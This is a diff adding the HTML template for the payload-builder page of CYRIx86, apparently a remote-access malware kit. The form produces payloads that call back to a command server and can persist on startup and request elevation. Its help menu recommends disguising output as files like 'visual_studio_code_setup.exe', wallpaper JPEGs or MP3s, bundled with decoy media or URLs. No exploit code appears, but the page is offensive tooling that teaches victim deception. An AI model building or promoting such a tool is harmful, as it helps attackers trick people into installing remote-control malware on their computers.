@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CREATE - CYRIx86</title>
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="/assets/css/create.css">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"
+        integrity="sha512-zoJXRvW2gC8Z0Xo3lBbao5+AS3g6YWr5ztKqaicua11xHo+AvE1b0lT9ODgrHTmNUxeCw0Ry4BGRYZfXu70weg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="/assets/js/main.js"></script>
+    <script src="/assets/js/create-b.js" defer></script>
+</head>
+
+<body>
+    <%- include("bg") %>
+
+        <div class="main-container">
+            <div class="main-header">
+                <div class="left">
+                    <h2 class="tool-title">
+                        <p>CYRI<span>x</span>86</p>
+                        <small>-by madhanmaaz</small>
+                    </h2>
+                </div>
+
+                <div class="center">
+                    <h3>PAYLOAD BUILDER</h3>
+                </div>
+
+                <div class="right">
+                    <button class="b-btn" id="build-payload" title="Build">
+                        <i class="fa-solid fa-hammer"></i>
+                    </button>
+                    <button class="b-btn" id="help-btn" title="help menu"><i
+                            class="fa-solid fa-circle-info"></i></button>
+                    <a href="/">
+                        <button class="b-btn" title="home"><i class="fa-solid fa-house"></i></button>
+                    </a>
+                </div>
+            </div>
+
+            <div class="main-content">
+                <div class="payload-form">
+                    <b>The new Target connection will take time to connect. 25s to 1:40s depend on device hardware.</b>
+                    <div class="box-inp">
+                        <label>payload</label>
+                        <select id="inp" name="payload">
+                            <option value="" disabled selected>-- select --</option>
+                            <% for(let payload in payloads) {%>
+                                <option value="<%- payload %>"><%- payload %></option>
+                                <% } %>
+                        </select>
+                    </div>
+
+                    <div class="box-inp">
+                        <label>origin</label>
+                        <input type="text" name="origin" placeholder="http://localhost.com:433" id="inp"
+                            autocomplete="off">
+                    </div>
+
+                    <div class="box-inp">
+                        <label>startup</label>
+                        <select name="startup" id="inp">
+                            <option value="False">false</option>
+                            <option value="True">true</option>
+                        </select>
+                    </div>
+
+                    <div class="box-inp">
+                        <label>request uac</label>
+                        <select name="uac" id="inp">
+                            <option value="False">false</option>
+                            <option value="True">true</option>
+                        </select>
+                    </div>
+
+                    <div class="box-inp">
+                        <label>filename</label>
+                        <input type="text" name="filename" placeholder="setup_file" id="inp" autocomplete="off">
+                    </div>
+
+                    <div class="box-inp">
+                        <label>addons</label>
+                        <select name="deliver" id="inp" class="deliver-input">
+                            <option value="1">nothing</option>
+                            <option value="2">media</option>
+                            <option value="3">url</option>
+                            <option value="4">cmd</option>
+                        </select>
+                    </div>
+
+                    <div class="deliver-options">
+                        <p>do nothing on open.</p>
+                    </div>
+                </div>
+
+                <div class="logs"></div>
+            </div>
+        </div>
+
+
+        <section class="help-content">
+            <h3>PAYLOAD BUILDER - HELP MENU <i id="help-close" class="fa-solid fa-xmark"></i></h3>
+            <pre><span>PAYLOADS    - select payload</span>
+                Ex: c, c++, go, vbs...etc</pre>
+            <pre><span>ORIGIN      - uri of the cyrix86 server [http/https] only</span>
+                Ex: http://localhost:10310
+                    https://cyrix86.com
+                    http://localhost:8080
+                    http://localhost
+                    https://payload.com:443
+                    https://localhostrun.com
+                    http://cloudflared.try.com
+                    https://ngrok-id.com</pre>
+
+            <pre><span>STARTUP     - set the payload on startup</span>
+                Ex: true
+                    false</pre>
+
+            <pre><span>REQUEST UAC - request for user access control</span>
+                Ex: true
+                    false</pre>
+
+            <pre><span>FILENAME    - build output filename</span>
+                Ex: test_setup
+                    car-wallpaper-hd
+                    desktop-wallpaper-4k.jpeg
+                    visual_studio_code_setup.exe
+                    new_song.mp3
+                    full_video.mp4</pre>
+
+            <pre><span>ADDONS      - embed with media, url...etc</span>
+                Ex: NOTHING
+                    -
+    
+                Ex: MEDIA
+                    url: https://wallpapercave.com/wp/wp13303651.jpg | filename: wallpaper.jpg
+                    url: https://ms.com/dbazure/download/stable/setup.exe | filename: visual_studio_code_setup.exe
+                    url: http://audio.com/music.mp3 | filename: new_song.mp3
+                    url: http://video.com/video.mp4 | filename: video_file.mp4
+    
+                Ex: URL
+                    https://google.com
+                    https://facebook.com
+                    https://visualstudio.microsoft.com
+                    https://wallpapercave.com
+                
+                Ex: CMD COMMANDS
+                    start notepad
+                    start chrome
+                    start control
+                    start explorer
+                    start calc
+                    </pre>
+        </section>
+</body>
+
+</html>
